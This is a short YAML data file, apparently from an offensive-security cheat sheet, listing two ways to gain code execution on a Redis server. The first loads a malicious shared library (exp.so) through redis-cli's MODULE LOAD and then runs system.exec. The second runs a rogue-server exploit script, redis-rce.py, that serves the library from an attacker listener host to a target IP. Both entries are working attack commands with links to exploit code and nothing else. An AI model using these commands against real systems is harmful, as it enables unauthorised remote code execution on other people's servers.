---
functions:
  gain-access:
    - description: Redis Command Execution
      code: |
        (1) Upload a shared library to a know filepath
        	https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so

        (2) redis-cli -h 192.168.208.93
        	MODULE LOAD <full-path-to-exp.so>/exp.so

        (3) system.exec 'id'

    - description: Redis Rogue Server
      code: |
         python2 redis-rce.py -r 192.168.200.93 -L 192.168.49.200 -f exp.so
         https://github.com/Ridter/redis-rce
         https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so
         
---
